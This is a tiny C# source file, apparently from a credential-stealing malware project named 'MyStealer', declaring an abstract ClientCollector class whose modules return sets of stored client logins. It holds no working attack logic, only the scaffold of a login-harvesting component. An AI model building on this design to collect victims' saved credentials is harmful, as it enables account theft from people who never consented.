using System.Collections.Immutable;

namespace MyStealer.Collectors.Client
{
    internal abstract class ClientCollector : ModuleBase
    {
        public abstract IImmutableSet<ClientLogin> GetLogins();
    }
}
